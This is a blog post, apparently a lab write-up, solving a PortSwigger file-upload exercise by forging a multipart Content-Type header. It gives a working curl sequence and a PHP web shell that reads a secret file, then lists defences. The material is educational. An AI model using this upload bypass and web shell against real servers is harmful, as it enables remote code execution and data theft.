---
layout: post
title: "PortSwigger: Web Shell Upload via Content-Type Restriction Bypass"
date: 2027-10-18 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, FileUpload]
tags: [portswigger, file-upload, web-shell, rce, php, content-type, cwe-434]
---

The previous file-upload lab took *anything* you handed it. This one tries to be careful — it checks the file type before saving — but it checks the one thing an attacker fully controls: the `Content-Type` header. So we lie about it. The file stays a `.php` web shell, we just tell the server it's a JPEG. This is still [CWE-434](https://cwe.mitre.org/data/definitions/434.html), Unrestricted Upload of File with Dangerous Type — the validation is just barely good enough to feel safe and not good enough to be.

## Overview

Logged in as `wiener:peter`, the **My Account** page has an avatar uploader, and uploaded files land at a predictable, PHP-enabled path:

```
/files/avatars/<filename>
```

Upload a plain `exploit.php` and the server rejects it:

> Sorry, only JPEG and PNG files are allowed.

That tells us the only thing standing between us and code execution is a **type check**. The question is *which* property of the file it inspects: the extension, the actual bytes, or the declared MIME type? If it were the extension or the contents, we'd need a disguise (a double extension, or a magic-byte polyglot). But this lab checks the **`Content-Type` header of the multipart upload part** — and that header is set by the client, not the server.

## The web shell

We only need to read one file, `/home/carlos/secret`, so a read-only shell is cleaner than a full command shell — a single bare GET returns the file with no `?cmd=` parameter to manage:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

## Exploitation

When you upload a `.php` file, your HTTP client labels that part `Content-Type: application/x-php`, which the server's allowlist rejects. The fix from the attacker's side is one line: declare the part as `image/jpeg` instead. With `curl`, the `type=` suffix on the `-F` field controls exactly that header:

```bash
URL=https://<id>.web-security-academy.net

# 1. Log in (302 = success)
csrf=$(curl -sk -c cookies.txt "$URL/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt -c cookies.txt "$URL/login" \
  -d "csrf=$csrf&username=wiener&password=peter"

# 2. Upload exploit.php but declare it as image/jpeg
csrf=$(curl -sk -b cookies.txt "$URL/my-account" | grep -oP 'name="csrf" value="\K[^"]+' | head -1)
printf "<?php echo file_get_contents('/home/carlos/secret'); ?>" > exploit.php
curl -sk -b cookies.txt "$URL/my-account/avatar" \
  -F "csrf=$csrf" -F "user=wiener" -F "avatar=@exploit.php;type=image/jpeg"
# -> "The file avatars/exploit.php has been uploaded."

# 3. Execute it — one GET returns the secret
curl -sk -b cookies.txt "$URL/files/avatars/exploit.php"
```

The upload succeeds, the file keeps its `.php` extension, and visiting it runs PHP. The third request returns Carlos's secret, which we submit to solve the lab:

```bash
curl -sk -b cookies.txt "$URL/submitSolution" -d "answer=<secret>"
# {"correct":true}
```

The lab's status widget flips to **Solved** immediately.

## Why it works

The `Content-Type` of a multipart upload part is supplied by the client and means nothing about the file's real nature. By trusting it, the server checks a value the attacker owns. Crucially, nothing else about the file had to change:

- The **extension stays `.php`**, so the web server still routes it to the PHP interpreter.
- The **bytes stay PHP**, so the code executes.
- Only the **declared MIME** flipped to `image/jpeg`, so the allowlist passes.

This is the distinct middle ground between the no-bypass case (server checks nothing) and the heavier disguises (double extension, magic-byte polyglot). Here a single forged header is the whole exploit.

## The fix

Never trust the client-supplied `Content-Type`. Defend with content, not declarations:

- Validate file type from the **actual bytes** (verify magic numbers, or re-encode images so any embedded payload is destroyed).
- **Allowlist extensions** and rename uploads to a random, server-generated name.
- Serve the upload directory with the **interpreter disabled**, so even a smuggled `.php` is delivered as inert text.

Any one of these defeats the attack; layering them makes the upload safe.
